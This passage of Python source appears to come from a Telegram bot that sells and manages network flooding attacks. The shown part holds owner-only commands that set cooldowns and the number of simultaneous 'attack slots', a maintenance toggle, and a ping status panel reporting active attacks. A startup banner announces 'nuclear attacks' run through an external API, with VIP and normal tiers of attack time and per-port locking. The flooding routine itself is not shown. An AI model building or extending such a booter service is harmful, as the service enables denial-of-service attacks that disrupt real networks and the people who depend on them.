        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()

    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"{HTML_EMOJI.TIMER} <b>𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧:</b> {current}s\n\n𝐂𝐡𝐚𝐧𝐠𝐞: <code>/cooldown &lt;seconds&gt;</code>", reply_to=message)
        return

    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐧𝐞𝐠𝐚𝐭𝐢𝐯𝐞!</b>", reply_to=message)
            return

        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐬𝐞𝐭:</b> {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>", reply_to=message)


@bot.message_handler(commands=["setmaxslot"])
def set_max_slot_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/setmaxslot &lt;slots&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/setmaxslot 4</code>\n\n𝐓𝐡𝐢𝐬 𝐬𝐞𝐭𝐬 𝐡𝐨𝐰 𝐦𝐚𝐧𝐲 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐜𝐚𝐧 𝐫𝐮𝐧 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬𝐥𝐲.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        global current_max_slots
        new_slots = int(command_parts[1])

        if new_slots < 1:
            new_slots = 1
        if new_slots > 10:
            new_slots = 10

        current_max_slots = new_slots
        set_setting('max_concurrent_slots', new_slots)

        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐌𝐚𝐱 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐥𝐨𝐭𝐬 𝐬𝐞𝐭 𝐭𝐨: {new_slots}</b>\n\n𝐍𝐨𝐰 {new_slots} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐜𝐚𝐧 𝐫𝐮𝐧 𝐚𝐭 𝐭𝐡𝐞 𝐬𝐚𝐦𝐞 𝐭𝐢𝐦𝐞.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b> 𝐔𝐬𝐞: <code>/setmaxslot &lt;slots&gt;</code>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


# ============ MAINTENANCE COMMANDS ============

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/maintenance &lt;message&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/maintenance Bot is updating, wait 10 minutes</code>", reply_to=message)
        return

    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.SETTINGS} <b>𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐌𝐨𝐝𝐞 𝐎𝐍!</b>\n\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {msg}\n\n𝐔𝐬𝐞 /ok 𝐭𝐨 𝐭𝐮𝐫𝐧 𝐨𝐟𝐟", reply_to=message)


@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    if not is_maintenance():
        safe_send_message(message.chat.id, f"{HTML_EMOJI.INFO} <b>𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐦𝐨𝐝𝐞 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐎𝐅𝐅!</b>", reply_to=message)
        return

    set_maintenance(False)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐌𝐨𝐝𝐞 𝐎𝐅𝐅!</b>\n\n𝐁𝐨𝐭 𝐢𝐬 𝐧𝐨𝐰 𝐧𝐨𝐫𝐦𝐚𝐥.", reply_to=message)


# ============ ID / PING COMMANDS ============

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"{HTML_EMOJI.PROFILE} <b>𝐘𝐨𝐮𝐫 𝐈𝐃:</b> <code>{user_id}</code>", reply_to=message)


@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()

    total_users = users_collection.count_documents({})
    maintenance_status = f"{HTML_EMOJI.CHECKMARK} 𝐃𝐢𝐬𝐚𝐛𝐥𝐞𝐝" if not is_maintenance() else f"{HTML_EMOJI.CROSS} 𝐄𝐧𝐚𝐛𝐥𝐞𝐝"

    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"

    response_time = int((datetime.now() - start_time).total_seconds() * 1000)

    busy_slots, free_slots, total_slots = get_slot_status()
    active_groups = approved_groups_collection.count_documents({})
    private_users = bot_users_collection.count_documents({})
    blocked_ips_count = len(get_all_blocked_ips())

    response = f"{HTML_EMOJI.LIVE} <b>𝐁𝐨𝐭 𝐏𝐨𝐧𝐠!</b>\n\n"
    response += f"{HTML_EMOJI.FIRE} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐓𝐢𝐦𝐞:</b> {response_time} 𝐦𝐬\n"
    response += f"{HTML_EMOJI.EXPLOSION} <b>𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:</b> {busy_slots}/{total_slots}\n"
    response += f"{HTML_EMOJI.USERS} <b>𝐀𝐜𝐭𝐢𝐯𝐞 𝐆𝐫𝐨𝐮𝐩𝐬:</b> {active_groups}\n"
    response += f"{HTML_EMOJI.PROFILE} <b>𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐔𝐬𝐞𝐫𝐬:</b> {private_users}\n"
    response += f"{HTML_EMOJI.BAN} <b>𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬:</b> {blocked_ips_count}\n"
    response += f"{HTML_EMOJI.LOCK} <b>𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐌𝐨𝐝𝐞:</b> {maintenance_status}\n"
    response += f"{HTML_EMOJI.TIMER} <b>𝐔𝐩𝐭𝐢𝐦𝐞:</b> {uptime_str}"

    safe_send_message(message.chat.id, response, reply_to=message)


# ============ START BOT ============

print("=" * 60)
print("✅ BOT STARTING WITH NUCLEAR ATTACK VIA EXTERNAL API ✅")
print("=" * 60)
print(f"🤖 BOT_TOKEN: {'SET' if BOT_TOKEN else 'MISSING'}")
print(f"🔥 API_BASE_URL: {'SET' if API_BASE_URL else 'MISSING'}")
print(f"💥 API_KEY: {'SET' if API_KEY else 'MISSING'}")
print(f"⚙️ Max Simultaneous Slots: {current_max_slots}")
print(f"⚔️ Concurrent Per Attack: {get_concurrent_limit()}")
print(f"🏖️ Max Attack Time (Normal): {get_max_attack_time()}s")
print(f"💎 VIP Max Attack Time: {get_key_max_attack('VIP')}s")
print(f"👹 NORMAL Max Attack Time: {get_key_max_attack('NORMAL')}s")
print(f"⏱️ Cooldown: {get_user_cooldown_setting()}s")
print(f"⛔ IP Blocking: Active")
print("=" * 60)
print("🎊 ALL COMMANDS WORKING 🎊")
print("🚀 NUCLEAR ATTACKS ENABLED VIA API")
print("✅ STATUS COMMAND AUTO-UPDATES EVERY 5 SECONDS")
print("🔗 NON-BLOCKING ATTACKS - BOT RESPONSIVE")
print("❌ PORT PROTECTION: SAME PORT CANNOT BE ATTACKED WHILE ACTIVE")

if __name__ == "__main__":
    if not BOT_TOKEN:
        print("⛔ ERROR: BOT_TOKEN is empty! Bot cannot start.")
        exit(1)
    try:
        # Delete any existing webhook before polling
        bot.remove_webhook()
        print("✅ Webhook deleted, starting polling...")
        bot.infinity_polling(timeout=20, long_polling_timeout=20)
    except Exception as e:
        print(f"⛔ Main bot error: {e}")